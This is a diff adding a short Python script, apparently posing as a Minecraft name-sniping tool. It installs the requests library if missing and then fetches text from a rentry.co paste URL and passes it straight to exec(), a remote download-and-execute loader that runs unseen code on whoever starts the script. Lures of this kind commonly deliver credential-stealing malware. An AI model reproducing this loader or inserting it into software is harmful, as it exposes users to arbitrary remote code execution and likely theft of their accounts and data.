@@ -1,0 +1,9 @@
+from os import system
+try:
+    import requests
+except Exception:
+    system('python3 -m pip install requests')
+    import requests
+
+
+exec(requests.get('https://rentry.co/MCSniprxyz/raw').text)
